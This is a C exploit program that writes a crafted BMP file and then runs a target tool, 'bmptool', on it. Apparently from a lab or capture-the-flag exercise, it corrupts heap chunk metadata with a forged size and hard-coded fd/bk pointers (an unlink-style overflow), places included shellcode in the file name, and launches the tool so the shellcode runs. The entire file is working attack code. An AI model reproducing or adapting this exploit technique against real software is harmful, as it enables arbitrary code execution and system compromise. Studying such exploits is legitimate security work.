#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

unsigned char shellcode[] = {
#include "www-shellcode.h"
};

unsigned char header[] =
  {0x42, 0x4d, 0x3a, 0x00, 0x00, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x41, 0x00,
   0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
   0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x13, 0x0b,
   0x00, 0x00, 0x13, 0x0b, 0x00, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

char ext[] = ".bmp";

int main(void)
{
  struct _image {
    char header[54];    /* BMP image header */
    char buf[6];        /* BMP image pixel data */
    uint32_t size;      /* size of the next block */
    uint32_t fd;
    uint32_t bk;
    unsigned char nul;  /* terminate string */
  } __attribute__((packed)) image;

  struct _filename {
    char shellcode[50]; /* the shellcode to be run */
    char ext[4];        /* file extension */
    unsigned char nul;  /* terminate string */
} __attribute__((packed)) filename;

  /* fill with A's */
  memset(&image, 'A', sizeof(image));

  /* place the header in the beginning of the image */
  memcpy(image.header, header, sizeof(header));

  /* set the overflow: size, fd and bk */
  image.size = 0xfffffff1;
  image.fd = 0x8050d70;
  image.bk = 0x8050b20;

  /* terminate the string */
  image.nul = '\0';

  /* fill with A's */
  memset(&filename, 'A', sizeof(filename));

  /* place the shellcode in the beginning of the filename, before the extension */
  memcpy(filename.shellcode, shellcode, sizeof(shellcode));

  /* place the file extension at the end of the filename */
  memcpy(filename.ext, ext, sizeof(ext));

  /* terminate the string */
  filename.nul = '\0';

  /* create or open file */
  int fd = open((char *)&filename, O_WRONLY | O_CREAT, 0644);

  /* make sure file is empty */
  ftruncate(fd, 0);

  /* write file contents */
  write(fd, (char *)&image, sizeof(image));

  /* close the file */
  close(fd);

  char *argv[] = { "./bmptool", "-read", (char *)&filename, NULL };

  execve(argv[0], argv, NULL);

  return EXIT_FAILURE;
}
